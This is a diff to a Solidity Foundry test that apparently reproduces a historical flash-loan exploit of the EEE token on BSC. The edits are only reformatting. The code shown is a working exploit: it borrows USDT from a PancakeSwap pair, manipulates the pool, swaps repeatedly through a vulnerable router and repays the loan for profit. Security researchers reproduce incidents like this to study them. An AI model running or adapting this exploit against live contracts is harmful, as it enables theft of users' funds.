@@ -13,9 +13,9 @@ import "../basetest.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x0506e571aba3dd4c9d71bed479a4e6d40d95c833#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 
 // @Other Findings
 // address 0xde19b6f4eaaf3a897d1b190d37c86d6ef3b24d02 gained 9,358,702 EEE Token
@@ -28,7 +28,7 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface IPancakePool {
-    function swap(uint, uint, address, bytes calldata) external;
+    function swap(uint256, uint256, address, bytes calldata) external;
 }
 
 interface IAttackRouter {
@@ -47,41 +47,39 @@ contract ContractTest is Test {
     address EEE = 0x297f3996Ce5C2Dcd033c77098ca9e1acc3c3C3Ee;
     address swap_router = 0x5002F2D9Ac1763F9cF02551B3A72a42E792AE9Ea;
 
-
     function setUp() external {
-        cheats.createSelectFork("bsc", 33940984-1);
+        cheats.createSelectFork("bsc", 33_940_984 - 1);
     }
 
     function testExploit() external {
         uint256 before = usdt.balanceOf(address(this));
         emit log_named_uint("[Begin] Attacker USDT before exploit", before);
         address me = address(this);
-        pancake.swap(750000000000000000000000, 0, me, "0x00");
+        pancake.swap(750_000_000_000_000_000_000_000, 0, me, "0x00");
         uint256 after_attack = usdt.balanceOf(address(this));
         emit log_named_uint("[End] Attacker USDT after exploit", after_attack);
-        emit log_named_uint("[End] Profit in $", (after_attack-before)/1e18);
+        emit log_named_uint("[End] Profit in $", (after_attack - before) / 1e18);
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         usdt.transfer(cake_LP, amount0); // transfer usdt to the LP, surging the usdt supply
 
-        uint256 EEE_amount = 52000000000000000000000000;
+        uint256 EEE_amount = 52_000_000_000_000_000_000_000_000;
         IPancakePool(cake_LP).swap(EEE_amount, 0, address(this), ""); // get EEE
-        IERC20(EEE).approve(swap_router, 100000000000000000000000000000000);
+        IERC20(EEE).approve(swap_router, 100_000_000_000_000_000_000_000_000_000_000);
 
         // swap EEE to USDT
-        IAttackRouter(swap_router).swap(EEE, 3000000000000000000000000);
+        IAttackRouter(swap_router).swap(EEE, 3_000_000_000_000_000_000_000_000);
         uint8 index = 0;
         while (index < 8) {
-            IAttackRouter(swap_router).swap(EEE, 800000000000000000000000);
+            IAttackRouter(swap_router).swap(EEE, 800_000_000_000_000_000_000_000);
             index++;
         }
 
         IERC20(EEE).transfer(cake_LP, IERC20(EEE).balanceOf(address(this))); // transfer directly to the LP
 
-        IPancakePool(cake_LP).swap(0, 188300000000000000000000, address(this), ""); // swap EEE to USDT
-        usdt.transfer(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0, 751950000000000000000000); // payback
-
+        IPancakePool(cake_LP).swap(0, 188_300_000_000_000_000_000_000, address(this), ""); // swap EEE to USDT
+        usdt.transfer(0xa75C7EeF342Fc4c024253AA912f92c8F4C0401b0, 751_950_000_000_000_000_000_000); // payback
     }
 
     fallback() external payable {}
